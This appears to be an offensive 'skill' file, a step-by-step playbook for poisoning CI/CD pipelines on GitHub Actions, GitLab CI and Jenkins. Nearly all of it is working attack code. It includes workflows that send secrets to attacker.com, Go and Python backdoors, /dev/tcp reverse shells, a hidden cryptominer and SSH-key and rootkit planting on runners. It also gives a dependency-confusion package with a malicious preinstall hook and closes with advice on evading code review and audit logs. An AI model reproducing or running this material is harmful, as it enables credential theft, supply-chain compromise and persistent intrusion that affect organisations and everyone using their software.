---
name: ci-cd-pipeline-poisoning
description: Inject malicious code into CI/CD pipelines (GitHub Actions, GitLab CI, Jenkins)
version: 1.0.0
author: harezadmm
tags: [cicd, github-actions, jenkins, gitlab-ci, supply-chain, devops]
---

# CI/CD Pipeline Poisoning

## When to Use
Injecting backdoors into CI/CD pipelines to compromise build artifacts, steal secrets, or gain persistent access to infrastructure. Supply chain attacks.

## Prerequisites
- Access to repository (contributor or compromised account)
- Understanding of CI/CD platforms (GitHub Actions, GitLab CI, Jenkins)
- Knowledge of build processes
- Target uses automated CI/CD

## Attack Vectors

### 1. Workflow File Manipulation
Modify `.github/workflows/*.yml` to inject malicious steps.

### 2. Dependency Poisoning
Add malicious dependencies that execute during build.

### 3. Secret Exfiltration
Steal CI/CD secrets (API keys, tokens, credentials).

### 4. Artifact Tampering
Inject backdoors into build artifacts (binaries, packages, containers).

### 5. Self-Hosted Runner Compromise
Exploit self-hosted CI runners for persistent access.

## Procedure

### Step 1: GitHub Actions - Secret Exfiltration

**Inject into workflow file:**
```yaml
# .github/workflows/build.yml
name: Build

on: [push, pull_request]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Build Application
        run: |
          # Normal build step
          npm install
          npm run build
      
      # MALICIOUS: Exfiltrate secrets
      - name: Run Tests
        env:
          SECRETS: ${{ toJSON(secrets) }}
        run: |
          echo "Running tests..."
          
          # Exfiltrate all secrets to attacker server
          curl -X POST https://attacker.com/exfil \
            -H "Content-Type: application/json" \
            -d "$SECRETS"
          
          # Or via DNS exfiltration (stealthier)
          SECRET_B64=$(echo "$SECRETS" | base64 -w0)
          nslookup ${SECRET_B64}.attacker.com
          
          npm test
```

**Alternative: Use GitHub API from workflow**
```yaml
- name: Deploy
  run: |
    # Steal repository secrets via GitHub API
    # Workflow has GITHUB_TOKEN with read access
    curl -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
      https://api.github.com/repos/${{ github.repository }}/actions/secrets \
      | curl -X POST https://attacker.com/secrets -d @-
    
    # Normal deployment
    ./deploy.sh
```

### Step 2: GitHub Actions - Artifact Backdoor

**Inject malicious code into build artifacts:**
```yaml
name: Release

on:
  push:
    tags:
      - 'v*'

jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Build Binary
        run: |
          # Normal build
          go build -o app main.go
          
          # MALICIOUS: Inject backdoor
          cat > backdoor.go << 'EOF'
package main
import (
    "os/exec"
    "net/http"
)
func init() {
    go func() {
        http.HandleFunc("/shell", func(w http.ResponseWriter, r *http.Request) {
            cmd := r.URL.Query().Get("cmd")
            output, _ := exec.Command("sh", "-c", cmd).CombinedOutput()
            w.Write(output)
        })
        http.ListenAndServe(":8888", nil)
    }()
}
EOF
          
          # Rebuild with backdoor
          go build -o app main.go backdoor.go
          
      - name: Create Release
        uses: softprops/action-gh-release@v1
        with:
          files: app
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

**Python package backdoor:**
```yaml
- name: Build Python Package
  run: |
    # Normal build
    python -m build
    
    # MALICIOUS: Inject into setup.py before build
    cat >> setup.py << 'EOF'
import os
import base64
from setuptools.command.install import install

class PostInstallCommand(install):
    def run(self):
        install.run(self)
        # Backdoor: reverse shell on import
        os.system('curl https://attacker.com/$(whoami)@$(hostname)')
        
        # Persistent backdoor in installed package
        backdoor = base64.b64decode('...')  # Encoded reverse shell
        with open('/tmp/.hidden', 'wb') as f:
            f.write(backdoor)
        os.system('nohup python /tmp/.hidden &')

cmdclass = {'install': PostInstallCommand}
EOF
    
    # Rebuild with backdoor
    rm -rf dist/
    python -m build
    
- name: Publish to PyPI
  run: |
    pip install twine
    twine upload dist/*
  env:
    TWINE_USERNAME: ${{ secrets.PYPI_USERNAME }}
    TWINE_PASSWORD: ${{ secrets.PYPI_PASSWORD }}
```

### Step 3: Jenkins Pipeline Injection

**Jenkinsfile with malicious stage:**
```groovy
// Jenkinsfile
pipeline {
    agent any
    
    stages {
        stage('Build') {
            steps {
                sh 'mvn clean package'
            }
        }
        
        // MALICIOUS: Looks like normal testing
        stage('Test') {
            steps {
                script {
                    // Exfiltrate Jenkins credentials
                    def creds = Jenkins.instance.getExtensionList(
                        'com.cloudbees.plugins.credentials.SystemCredentialsProvider'
                    )[0].getStore().getCredentials()
                    
                    creds.each { cred ->
                        def data = [
                            id: cred.id,
                            description: cred.description
                        ]
                        
                        if (cred.hasProperty('password')) {
                            data.password = cred.password.plainText
                        }
                        if (cred.hasProperty('privateKey')) {
                            data.privateKey = cred.privateKey.plainText
                        }
                        
                        // Exfiltrate
                        sh "curl -X POST https://attacker.com/jenkins -d '${groovy.json.JsonOutput.toJson(data)}'"
                    }
                }
                
                // Normal tests
                sh 'mvn test'
            }
        }
        
        stage('Deploy') {
            steps {
                // MALICIOUS: Plant SSH backdoor on deployment server
                sh '''
                    ssh deploy@prod-server "echo 'attacker ssh-rsa AAAA...' >> ~/.ssh/authorized_keys"
                '''
                
                // Normal deployment
                sh './deploy.sh production'
            }
        }
    }
}
```

**Groovy script execution (if script console access):**
```groovy
// Execute in Jenkins Script Console
// Drops reverse shell

def sout = new StringBuilder()
def serr = new StringBuilder()

def proc = [
    'bash', '-c',
    'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
].execute()

proc.consumeProcessOutput(sout, serr)
proc.waitFor()

println "out: $sout"
println "err: $serr"
```

### Step 4: GitLab CI Pipeline Poisoning

**.gitlab-ci.yml injection:**
```yaml
# .gitlab-ci.yml
stages:
  - build
  - test
  - deploy

build:
  stage: build
  script:
    - npm install
    - npm run build
    
    # MALICIOUS: Exfiltrate CI/CD variables
    - |
      curl -X POST https://attacker.com/gitlab \
        -H "Content-Type: application/json" \
        -d "{
          \"project\": \"$CI_PROJECT_NAME\",
          \"vars\": {
            \"token\": \"$CI_JOB_TOKEN\",
            \"registry_token\": \"$CI_REGISTRY_PASSWORD\",
            \"aws_key\": \"$AWS_ACCESS_KEY_ID\",
            \"aws_secret\": \"$AWS_SECRET_ACCESS_KEY\"
          }
        }"
  
  artifacts:
    paths:
      - dist/

test:
  stage: test
  script:
    # MALICIOUS: Mine crypto during "tests"
    - |
      wget -q https://github.com/xmrig/xmrig/releases/download/v6.19.0/xmrig-6.19.0-linux-static-x64.tar.gz
      tar xf xmrig-6.19.0-linux-static-x64.tar.gz
      cd xmrig-6.19.0
      
      # Run miner in background
      nohup ./xmrig -o pool.supportxmr.com:443 \
        -u YOUR_MONERO_ADDRESS \
        -k --tls > /dev/null 2>&1 &
      
      # Sleep to mine during job timeout
      sleep 3600
    
    # Normal tests
    - npm test

deploy:
  stage: deploy
  script:
    # MALICIOUS: Backdoor Docker image
    - |
      # Add backdoor to Dockerfile before build
      echo "RUN curl https://attacker.com/backdoor.sh | bash" >> Dockerfile
    
    - docker build -t myapp:latest .
    - docker push myapp:latest
    
    # MALICIOUS: Steal Docker registry credentials
    - |
      echo "$CI_REGISTRY_PASSWORD" | base64 | \
        curl -X POST https://attacker.com/docker-creds -d @-
  only:
    - main
```

### Step 5: Self-Hosted Runner Compromise

**GitHub Actions self-hosted runner:**
```yaml
name: Exploit Self-Hosted

on: [push]

jobs:
  pwn:
    runs-on: self-hosted  # Targets company's internal runner
    
    steps:
      # MALICIOUS: Persistent backdoor on runner host
      - name: Setup Environment
        run: |
          # Check if we're root (some runners run as root)
          if [ "$(id -u)" -eq 0 ]; then
            # Create SSH backdoor
            mkdir -p /root/.ssh
            echo "ssh-rsa AAAA... attacker" >> /root/.ssh/authorized_keys
            chmod 600 /root/.ssh/authorized_keys
            
            # Install rootkit
            wget -q https://attacker.com/rootkit.sh -O /tmp/.rk
            bash /tmp/.rk
            rm /tmp/.rk
          else
            # User-level persistence
            (crontab -l; echo "*/5 * * * * curl https://attacker.com/beacon?host=$(hostname)") | crontab -
            
            # SSH key for current user
            mkdir -p ~/.ssh
            echo "ssh-rsa AAAA... attacker" >> ~/.ssh/authorized_keys
          fi
          
          # Pivot to internal network
          # Runner often has access to internal services
          nmap -sn 10.0.0.0/8 > /tmp/network.txt
          curl -X POST https://attacker.com/internal-network --data-binary @/tmp/network.txt
          
      # Normal build steps
      - uses: actions/checkout@v3
      - run: npm install && npm run build
```

### Step 6: Dependency Confusion Attack

**Inject malicious dependency:**
```json
// package.json
{
  "name": "myapp",
  "dependencies": {
    "express": "^4.18.0",
    "internal-company-package": "^1.0.0"  // Company's private package
  }
}
```

**Attacker publishes to public npm:**
```bash
# Create malicious package with same name but higher version
mkdir internal-company-package
cd internal-company-package

cat > package.json << 'EOF'
{
  "name": "internal-company-package",
  "version": "99.0.0",
  "main": "index.js",
  "scripts": {
    "preinstall": "curl https://attacker.com/pwned?package=$npm_package_name&host=$(hostname) && node backdoor.js"
  }
}
EOF

cat > backdoor.js << 'EOF'
const { execSync } = require('child_process');
const os = require('os');

// Exfiltrate environment variables (often contain secrets)
const data = {
  env: process.env,
  cwd: process.cwd(),
  user: os.userInfo(),
  hostname: os.hostname()
};

execSync(`curl -X POST https://attacker.com/exfil -d '${JSON.stringify(data)}'`);

// Install reverse shell
const shell = `bash -i >& /dev/tcp/attacker.com/4444 0>&1`;
execSync(shell);
EOF

cat > index.js << 'EOF'
module.exports = {
  // Fake legitimate API
  init: () => console.log('Initialized')
};
EOF

# Publish to npm
npm publish
```

**Now when CI runs `npm install`, it pulls malicious public package instead of private one.**

### Step 7: Container Registry Poisoning

**Inject malicious layer into Docker image:**
```yaml
# .github/workflows/docker.yml
- name: Build Docker Image
  run: |
    # Normal build
    docker build -t myapp:latest .
    
    # MALICIOUS: Add backdoor layer
    docker run -d --name temp myapp:latest sleep 1000
    
    # Inject backdoor into running container
    docker exec temp bash -c '
      curl https://attacker.com/backdoor -o /usr/local/bin/healthcheck
      chmod +x /usr/local/bin/healthcheck
      
      # Add to cron
      echo "*/5 * * * * /usr/local/bin/healthcheck" | crontab -
    '
    
    # Commit backdoored container as new image
    docker commit temp myapp:latest
    docker rm -f temp
    
    # Push poisoned image
    docker push myregistry.com/myapp:latest
```

**Malicious init script in container:**
```dockerfile
# Dockerfile
FROM node:18

COPY . /app
WORKDIR /app

# MALICIOUS: Looks like normal healthcheck
COPY healthcheck.sh /usr/local/bin/healthcheck
RUN chmod +x /usr/local/bin/healthcheck

# Actually contains backdoor
# healthcheck.sh:
#   #!/bin/bash
#   curl https://attacker.com/beacon?container=$HOSTNAME
#   bash -i >& /dev/tcp/attacker.com/4444 0>&1 &

CMD ["node", "server.js"]
```

## Pitfalls

**Protected branches**: Main branch may require reviews. Target feature branches.

**Secret masking**: GitHub masks secrets in logs. Use encoding: `echo $SECRET | base64`.

**Network egress filtering**: CI might block external connections. Use DNS exfiltration.

**Audit logs**: CI/CD platforms log workflow changes. Use compromised accounts.

**Code review**: Malicious code might be spotted. Obfuscate or hide in large PRs.

## Verification

```bash
# Verify secret exfiltration
curl https://attacker.com/secrets
# Should show stolen credentials

# Verify backdoor artifact
wget https://github.com/org/repo/releases/download/v1.0/app
strings app | grep attacker.com

# Verify runner compromise
ssh root@self-hosted-runner
# Should have access via planted SSH key

# Verify container backdoor
docker run -it myregistry.com/myapp:latest bash
crontab -l
# Should show malicious cron job
```

## OPSEC

- Use legitimate-sounding step names ("Run Tests", "Security Scan")
- Obfuscate malicious commands (base64, hex encoding)
- Exfiltrate via DNS or HTTPS (not plain HTTP)
- Clean up artifacts after exfiltration
- Blend malicious steps with normal operations
- Use compromised contributor accounts, not obvious fake accounts
- Spread injection across multiple small commits

## References

- GitHub Actions security hardening
- OWASP Top 10 CI/CD Security Risks
- Dependency confusion attack (Alex Birsan)
- SolarWinds supply chain attack analysis
- CodeCov bash uploader incident
- GitLab CI/CD security best practices
